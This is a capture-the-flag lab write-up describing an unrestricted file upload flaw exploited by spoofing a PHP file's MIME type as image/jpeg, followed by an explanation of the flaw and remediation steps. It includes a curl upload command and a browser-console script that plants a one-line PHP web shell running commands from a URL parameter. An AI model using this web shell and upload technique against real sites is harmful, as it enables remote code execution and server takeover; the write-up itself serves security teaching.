# Breach: Arbitrary File Upload via MIME Type Spoofing

## Discovery & Exploit

The site includes a file upload form which claims to only accept `.jpg` images.

We attempted uploading various file types, and eventually tried uploading a `.php` file while spoofing the MIME type as `image/jpeg`.

Using `curl`, we submitted the following request:

```
curl -F "uploaded=@shell.php;type=image/jpeg" -F "Upload=Upload" http://192.168.1.101/?page=upload
```

The server did not perform backend validation of file contents or extension, and the file was successfully uploaded and interpreted as PHP.

Upon execution of the uploaded script, the server responded with:

``The flag is: [actual flag value]``

To simplify the process, we wrote a JavaScript snippet that replicates the upload directly from the browser console. This eliminates the need for external tools like `curl`.

> You can run the following script directly in the browser's developer console:

```javascript
// upload-image.js
const formData = new FormData();
formData.append("Upload", "Upload");
formData.append("uploaded", new File(["<?php echo shell_exec($_GET['cmd']); ?>"], "shell.php", { type: "image/jpeg" }));

fetch("http://192.168.1.101/?page=upload", {
  method: "POST",
  body: formData
}).then(res => res.text()).then(html => console.log("Uploaded. Check server response or path."));
```

## Vulnerability Details

This is a classic case of **unrestricted file upload**, where the server:

- Accepts a file based on MIME type or extension alone (client-side enforced)
- Fails to inspect or validate the file contents on the backend
- Stores and executes files in a web-accessible location

Combined, these flaws allow an attacker to upload a **malicious PHP script** under the guise of a `.jpg`, leading to **remote code execution** and full system compromise.

References:

- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://portswigger.net/web-security/file-upload

## Remediation

1. Always validate file content types on the server side.
2. Never trust the MIME type or file extension provided by the client.
3. Store uploads outside of the web root when possible.
4. Rename uploaded files to prevent code execution.
5. Disallow executable file types entirely (e.g., `.php`, `.exe`, `.js`, `.jsp`).
6. Set appropriate Content-Disposition headers and file permissions.

---

<table width="100%">
  <tr>
    <td align="left"><a href="../../Breach13_PasswordOnlyAuthBypass/Ressources/writeup.md">← Previous: Breach13</a></td>
    <td align="center"><a href="../../README.md">↑ Back to README</a></td>
    <td align="right">Finish</td>
  </tr>
</table>
